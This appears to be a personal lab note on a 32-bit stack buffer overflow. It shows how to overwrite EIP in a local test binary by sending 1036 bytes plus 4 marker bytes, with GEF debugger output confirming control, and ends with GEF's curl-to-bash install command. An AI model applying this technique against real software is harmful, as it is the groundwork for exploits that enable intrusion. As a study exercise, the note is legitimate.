# Take Control of EIP Section
![Pasted image 20211127181005](https://user-images.githubusercontent.com/87600765/146052962-3bb254ec-a803-452b-af8b-1211167f5a87.png)
 Now we know that eip can be overwritten with 1036 + 4 bytes we can verify it with this command:
```nasm
gef➤  run $(python -c "print '\x55' * 1036 + '\x66' *4")
Starting program: /mnt/c/Users/Jojo/documents/testcode/bow32 $(python -c "print '\x55' * 1036 + '\x66' *4")

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1
$ebx   : 0x55555555 ("UUUU"?)
$ecx   : 0xffffd750  →  0x4e414c00
$edx   : 0xffffd0f0  →  0xffffd300  →  0x149dc001
$esp   : 0xffffd0f0  →  0xffffd300  →  0x149dc001
$ebp   : 0x55555555 ("UUUU"?)
$esi   : 0xf7fb2000  →  0x001e9d6c
$edi   : 0xf7fb2000  →  0x001e9d6c
$eip   : 0x66666666 ("ffff"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd0f0│+0x0000: 0xffffd300  →  0x149dc001    ← $esp
0xffffd0f4│+0x0004: 0xffffd1c4  →  0xffffd315  →  "/mnt/c/Users/Jojo/documents/testcode/bow32"
0xffffd0f8│+0x0008: 0xffffd1d0  →  0xffffd751  →  "LANG=en_US.UTF-8"
0xffffd0fc│+0x000c: 0x565561f2  →  <main+20> add ebx, 0x2e0e
0xffffd100│+0x0010: 0xffffd120  →  0x00000002
0xffffd104│+0x0014: 0x00000000
0xffffd108│+0x0018: 0x00000000
0xffffd10c│+0x001c: 0xf7de6fd6  →  <__libc_start_main+262> add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x66666666
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bow32", stopped 0x66666666 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can see that the adress of EBP is `0x55555555`. You can also do 
```shell-session
gef➤  i r ebp
ebp            0x55555555          0x55555555
```
![Pasted image 20211127182110](https://user-images.githubusercontent.com/87600765/146053541-9aaf3e24-d21b-45b8-bdda-ee5601dad527.png)

The tool I used is call GEF. GEF is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis and exploit development. If you want to install it do 
```nasm
bash -c "$(curl -fsSL http://gef.blah.cat/sh)"
```
